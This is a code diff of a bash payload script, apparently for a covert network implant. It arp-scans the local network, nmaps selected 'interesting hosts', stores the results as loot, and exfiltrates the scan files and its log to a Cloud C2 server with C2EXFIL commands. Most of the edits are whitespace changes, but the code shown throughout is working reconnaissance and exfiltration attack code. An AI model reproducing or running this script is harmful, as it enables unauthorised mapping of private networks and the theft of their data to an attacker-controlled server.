@@ -426,7 +426,7 @@ function GRAB_NMAP_INTERESTING_HOSTS_LOOT() {
 	if [ "$GRAB_NMAP_INTERESTING_HOSTS_LOOT" = "true" ]; then
 		NMAP_INTERESTING_HOSTS_LOOT_FILE=$LOOT_DIR/nmap_interesting_hosts.txt
 		### Adding -oA nmap option to scan option
-                NMAP_OPTIONS_INTERESTING_HOSTS="${NMAP_OPTIONS_INTERESTING_HOSTS} -oA ${LOOT_DIR}/nmap-interesting-hosts-${SCAN_COUNT}-${TODAY}"
+    NMAP_OPTIONS_INTERESTING_HOSTS="${NMAP_OPTIONS_INTERESTING_HOSTS} -oA ${LOOT_DIR}/nmap-interesting-hosts-${SCAN_COUNT}-${TODAY}"
 		touch $NMAP_INTERESTING_HOSTS_LOOT_FILE
 		INTERESTING_HOSTS=( $(arp-scan --localnet | egrep $INTERESTING_HOSTS_PATTERN | awk {'print $1'} | awk '{print}' ORS='\t' | sed 's/.$//') )
 		INTERESTING_HOSTS+=( $(ip r | grep default | cut -d ' ' -f 3) )
@@ -440,7 +440,6 @@ function GRAB_NMAP_INTERESTING_HOSTS_LOOT() {
 		#nmap $NMAP_OPTIONS_INTERESTING_HOSTS ${INTERESTING_HOSTS[@]} -oN $NMAP_INTERESTING_HOSTS_LOOT_FILE && echo "Nmap scan ${#INTERESTING_HOSTS[@]} interesting host with nmap options: \"$NMAP_OPTIONS_INTERESTING_HOSTS\" executed succesfully" >> $LOG_FILE || echo "Nmap scan ${#INTERESTING_HOSTS[@]} interesting host with nmap options: \"$NMAP_OPTIONS_INTERESTING_HOSTS\" failed" >> $LOG_FILE
 		nmap $NMAP_OPTIONS_INTERESTING_HOSTS ${INTERESTING_HOSTS[@]} >> $NMAP_INTERESTING_HOSTS_LOOT_FILE && echo "Nmap scan ${#INTERESTING_HOSTS[@]} interesting host with nmap options: \"$NMAP_OPTIONS_INTERESTING_HOSTS\" executed succesfully" >> $LOG_FILE || echo "Nmap scan ${#INTERESTING_HOSTS[@]} interesting host with nmap options: \"$NMAP_OPTIONS_INTERESTING_HOSTS\" failed" >> $LOG_FILE
 	fi
-	return
 }
 
 function GRAB_DIG_LOOT() {
@@ -485,7 +484,7 @@ function EXFIL_TO_CLOUD_C2() {
 			done
 			
 			### Add exfiltration of nmap -oA files
-                        ## XML
+      ## XML
 			LOOT_FILES="$LOOT_DIR/*.xml"
 			for LOOT_FILE in $LOOT_FILES; do
 				LOOT_FILE_DESC=${LOOT_FILE/"$LOOT_DIR/"/}
@@ -494,7 +493,7 @@ function EXFIL_TO_CLOUD_C2() {
 				C2EXFIL STRING $LOOT_FILE $LOOT_FILE_DESC && echo "Exfiltration of $LOOT_FILE to Cloud C2 has passed" >> $LOG_FILE || echo "Exfiltration of $LOOT_FILE to Cloud C2 has failed" >> $LOG_FILE
 			done
 			
-                        ## GNMAP
+      ## GNMAP
 			LOOT_FILES="$LOOT_DIR/*.gnmap"
 			for LOOT_FILE in $LOOT_FILES; do
 				LOOT_FILE_DESC=${LOOT_FILE/"$LOOT_DIR/"/}
@@ -503,8 +502,8 @@ function EXFIL_TO_CLOUD_C2() {
 				C2EXFIL STRING $LOOT_FILE $LOOT_FILE_DESC && echo "Exfiltration of $LOOT_FILE to Cloud C2 has passed" >> $LOG_FILE || echo "Exfiltration of $LOOT_FILE to Cloud C2 has failed" >> $LOG_FILE
 			done
 			
-                        ## NMAP
-                        LOOT_FILES="$LOOT_DIR/*.nmap"
+      ## NMAP
+      LOOT_FILES="$LOOT_DIR/*.nmap"
 			for LOOT_FILE in $LOOT_FILES; do
 				LOOT_FILE_DESC=${LOOT_FILE/"$LOOT_DIR/"/}
 				LOOT_FILE_DESC=$SCAN_COUNT-$TODAY-${LOOT_FILE_DESC%.*}-loot
@@ -512,9 +511,9 @@ function EXFIL_TO_CLOUD_C2() {
 				C2EXFIL STRING $LOOT_FILE $LOOT_FILE_DESC && echo "Exfiltration of $LOOT_FILE to Cloud C2 has passed" >> $LOG_FILE || echo "Exfiltration of $LOOT_FILE to Cloud C2 has failed" >> $LOG_FILE
 			done
 			
-                        ### Exfiltrate log file
-                        LOG_FILE_DESC=$SCAN_COUNT-$TODAY-LOGFILE
-                        C2EXFIL STRING $LOG_FILE $LOG_FILE_DESC && echo "Exfiltration of $LOG_FILE to Cloud C2 has passed" >> $LOG_FILE || echo "Exfiltration of $LOG_FILE to Cloud C2 has failed" >> $LOG_FILE
+      ### Exfiltrate log file
+      LOG_FILE_DESC=$SCAN_COUNT-$TODAY-LOGFILE
+      C2EXFIL STRING $LOG_FILE $LOG_FILE_DESC && echo "Exfiltration of $LOG_FILE to Cloud C2 has passed" >> $LOG_FILE || echo "Exfiltration of $LOG_FILE to Cloud C2 has failed" >> $LOG_FILE
 		else
 			echo "Exfiltration of $LOOT_FILE to Cloud C2 has failed, CC-CLIENT seems not to be running" >> $LOG_FILE
 		fi
